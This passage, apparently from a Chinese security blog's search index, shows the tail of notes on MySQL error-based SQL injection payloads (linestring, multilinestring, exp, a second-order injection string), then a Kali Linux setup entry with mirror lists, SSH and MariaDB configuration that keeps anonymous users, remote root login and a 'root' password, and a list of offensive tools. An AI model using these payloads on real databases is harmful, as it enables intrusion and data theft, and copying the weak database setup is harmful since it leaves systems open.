operator">*</span> <span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>a<span class="token punctuation">)</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h6 id="8-linestring"><a href="#8-linestring" class="headerlink" title="8.linestring()"></a>8.linestring()</h6><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> test <span class="token keyword">where</span> id <span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token keyword">linestring</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>a<span class="token punctuation">)</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h6 id="9-multilinestring"><a href="#9-multilinestring" class="headerlink" title="9.multilinestring()"></a>9.multilinestring()</h6><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> test <span class="token keyword">where</span> id <span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token keyword">multilinestring</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>a<span class="token punctuation">)</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h6 id="10-exp"><a href="#10-exp" class="headerlink" title="10.exp()"></a>10.exp()</h6><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> test <span class="token keyword">where</span> id <span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> exp<span class="token punctuation">(</span><span class="token operator">~</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h6 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h6><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">xxx' <span class="token operator">and</span> exp<span class="token punctuation">(</span><span class="token operator">~</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> SQL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kali配置</title>
      <link href="/2021/09/30/kali%E9%85%8D%E7%BD%AE/"/>
      <url>/2021/09/30/kali%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="kali-配置"><a href="#kali-配置" class="headerlink" title="kali 配置"></a>kali 配置</h1><hr><h3 id="新-kali-配置"><a href="#新-kali-配置" class="headerlink" title="新 kali 配置"></a>新 kali 配置</h3><pre class="line-numbers language-none"><code class="language-none"># 创建root账户：sudo passwd root# 安装渗透所有黑客工具：sudo apt-get -y install kali-linux-everything# 修改源地址：cat &#x2F;etc&#x2F;apt&#x2F;sources.list或leafpad &#x2F;etc&#x2F;apt&#x2F;sources.list# 国内镜像源：#中科大deb http:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;kali kali-rolling main non-free contribdeb-src http:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;kali kali-rolling main non-free contrib #阿里云deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;kali kali-rolling main non-free contribdeb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;kali kali-rolling main non-free contrib #清华大学deb http:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;kali kali-rolling main contrib non-freedeb-src https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;kali kali-rolling main contrib non-free #浙大deb http:&#x2F;&#x2F;mirrors.zju.edu.cn&#x2F;kali kali-rolling main contrib non-freedeb-src http:&#x2F;&#x2F;mirrors.zju.edu.cn&#x2F;kali kali-rolling main contrib non-free #东软大学deb http:&#x2F;&#x2F;mirrors.neusoft.edu.cn&#x2F;kali kali-rolling&#x2F;main non-free contribdeb-src http:&#x2F;&#x2F;mirrors.neusoft.edu.cn&#x2F;kali kali-rolling&#x2F;main non-free contrib #官方源deb http:&#x2F;&#x2F;http.kali.org&#x2F;kali kali-rolling main non-free contribdeb-src http:&#x2F;&#x2F;http.kali.org&#x2F;kali kali-rolling main non-free contrib deb http:&#x2F;&#x2F;mirrors.163.com&#x2F;debian&#x2F; jessie main non-free contribdeb http:&#x2F;&#x2F;mirrors.163.com&#x2F;debian&#x2F; jessie-updates main non-free contribdeb http:&#x2F;&#x2F;mirrors.163.com&#x2F;debian&#x2F; jessie-backports main non-free contribdeb-src http:&#x2F;&#x2F;mirrors.163.com&#x2F;debian&#x2F; jessie main non-free contribdeb-src http:&#x2F;&#x2F;mirrors.163.com&#x2F;debian&#x2F; jessie-updates main non-free contribdeb-src http:&#x2F;&#x2F;mirrors.163.com&#x2F;debian&#x2F; jessie-backports main non-free contribdeb http:&#x2F;&#x2F;mirrors.163.com&#x2F;debian-security&#x2F; jessie&#x2F;updates main non-free contribdeb-src http:&#x2F;&#x2F;mirrors.163.com&#x2F;debian-security&#x2F; jessie&#x2F;updates main non-free contribapt-get update &amp;&amp; apt-get upgrade # 取回更新的软件包列表信息进行一次升级apt-get clean # 删除已经下载的安装包reboot  #重启<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="设置SSH，使其能够远程连接XShell"><a href="#设置SSH，使其能够远程连接XShell" class="headerlink" title="设置SSH，使其能够远程连接XShell"></a>设置SSH，使其能够远程连接XShell</h3><pre class="line-numbers language-none"><code class="language-none">打开SSH配置文件：vim &#x2F;etc&#x2F;ssh&#x2F;sshd_config 修改两个地方：重启SSH服务：&#x2F;etc&#x2F;init.d&#x2F;ssh restart  开启ssh服务：service ssh start  添加开机启动SSH服务：update-rc.d ssh enable关闭开机启动SSH服务：update-rc.d ssh disableXShell传输文件：rz #Windows向kali传输。要传到哪里先root模式进入当前文件夹，rz选择传输文件  rz   -y  # 如果覆盖原文件，执行：  sz &#123;文件&#125;  #下载文件，执行；  Alt+P #打开属性框。打开【文件传输】，这里可以调整传输的一些属性。下载文件，可以执行下载目录，下载文件时就不会再询问。上传文件，可以直接拖动文件到xshell上传，很方便。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="kali-MySQL数据库配置："><a href="#kali-MySQL数据库配置：" class="headerlink" title="kali - MySQL数据库配置："></a>kali - MySQL数据库配置：</h3><pre class="line-numbers language-none"><code class="language-none">########### kali 是默认安装MySQL的，只是需要我们配置一下：################### 启动MySQL：service mysql start# 初始化密码：mysql_secure_installation# 出现这个的时候，一路 Y 就可以了，中途需要设置密码NOTE: RUNNING ALL PARTS OF THIS SCRIPT IS RECOMMENDED FOR ALL MariaDB      SERVERS IN PRODUCTION USE!  PLEASE READ EACH STEP CAREFULLY!In order to log into MariaDB to secure it, we&#39;ll need the currentpassword for the root user.  If you&#39;ve just installed MariaDB, andyou haven&#39;t set the root password yet, the password will be blank,so you should just press enter here.Enter current password for root (enter for none): OK, successfully used password, moving on...Setting the root password ensures that nobody can log into the MariaDBroot user without the proper authorisation.You already have a root password set, so you can safely answer &#39;n&#39;.Change the root password? [Y&#x2F;n] yNew password: Re-enter new password: Password updated successfully!Reloading privilege tables.. ... Success!By default, a MariaDB installation has an anonymous user, allowing anyoneto log into MariaDB without having to have a user account created forthem.  This is intended only for testing, and to make the installationgo a bit smoother.  You should remove them before moving into aproduction environment.Remove anonymous users? [Y&#x2F;n] n ... skipping.Normally, root should only be allowed to connect from &#39;localhost&#39;.  Thisensures that someone cannot guess at the root password from the network.Disallow root login remotely? [Y&#x2F;n] n ... skipping.By default, MariaDB comes with a database named &#39;test&#39; that anyone canaccess.  This is also intended only for testing, and should be removedbefore moving into a production environment.Remove test database and access to it? [Y&#x2F;n] n ... skipping.Reloading the privilege tables will ensure that all changes made so farwill take effect immediately.Reload privilege tables now? [Y&#x2F;n] y ... Success!Cleaning up...All done!  If you&#39;ve completed all of the above steps, your MariaDBinstallation should now be secure.Thanks for using MariaDB!# 出现上述这个 ：Thanks for using MariaDB! 则说明配置成功！# 以root用户登录，密码为root（刚才自己设置的！）mysql -uroot -proot 以root用户登录，密码为root# 登录成功：Welcome to the MariaDB monitor.  Commands end with ; or \g.Your MariaDB connection id is 42Server version: 10.5.11-MariaDB-1 Debian 11Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.Type &#39;help;&#39; or &#39;\h&#39; for help. Type &#39;\c&#39; to clear the current input statement.MariaDB [(none)]&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="拓展：错误总结"><a href="#拓展：错误总结" class="headerlink" title="拓展：错误总结"></a>拓展：错误总结</h3><pre class="line-numbers language-none"><code class="language-none"># 安装Python第三方库：以mdeditor举例：先去官网搜索下载命令，然后用pip指令进行下载pip install django-mdeditor # 部署Gr33kLibrary报错信息处理：错误一：django.core.exceptions.ImproperlyConfigured: mysqlclient 1.3.13 or newer is required; you have 0.9.3.解决办法：安装pymysql，只需要降低django的版本就可以了pip install pymysqlpip install django&#x3D;&#x3D;2.1.4错误二：django.db.utils.InternalError: (1698, &quot;Access denied for user &#39;root&#39;@&#39;localhost&#39;&quot;)解决方法：先某度<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="kali-tools-工具列表："><a href="#kali-tools-工具列表：" class="headerlink" title="kali tools 工具列表："></a>kali tools 工具列表：</h2><ul><li>kali tools 工具列表</li><li>enum4 linux  ：用于检索windos 和 Samba 主机中的数据。</li><li>haping3 ：</li><li>masscan ：世界上最快的端口扫描工具、先用masscan 扫描资产、再用namp细扫。</li><li>nikto ：web服务器扫描工具、速度极快、类似于网络爬虫进行fuzz。可以通过wirshark 进行追踪数据流分析。</li><li>nmap：可以用来爆破、fuzz等</li><li>Sublist3r ：子域名枚举工具、需要链接外网Google的、新版kali目前不预装、可以自行下载、</li><li>exploitdb ：可以去查询POC</li><li>linux exploit Suggester ：GitHub可以进行搜索</li><li>beef ：XSS的利用工具</li><li>Armitage ：后渗透工具、msf图形化工具。适合小白学习使用</li><li>backdoor- factory（ka1i自带不好用）</li><li>routersploit：类似msf、网络服务基本的msf框架、针对路由器、防护墙的</li><li>msf</li><li>setoolkit：社会工程学框架、非常屌丝、社会工程学欺骗手段、也可以拿shell。不预装。</li><li>sqlmap：</li><li>Burp Suite</li><li>WPScan：</li><li>wfuzz：神器结合好的字典、能fuzz一切。fuzz 就是模糊测试就是蒙！</li><li>websploit：中间人的框架、不预装</li><li>owasp zap</li><li>w3af</li><li>Gobuster</li><li>recon-ng：研究研究其实很不错、信息搜集框架</li><li>netdiscover ：查网络的</li><li>shodan</li><li>what cms ：查网站指纹信息的</li><li>DIRB：目录扫描工具、类似于御剑。</li><li>curl：这也是个神器、需要详细了解、最简单的web poc 工具。没有之一。</li><li>John the Ripper ：破解密码的</li><li>wordlists：字典</li><li>Nishang</li><li>dntcp</li><li>Webshells ：构建webshell工具。</li><li>Hydra：爆破工具</li><li>apktool ：APK工具</li><li>impackt</li><li>locate ：</li></ul>]]></content>
      
      
      <categories>
          
          <category> kali </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kali </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
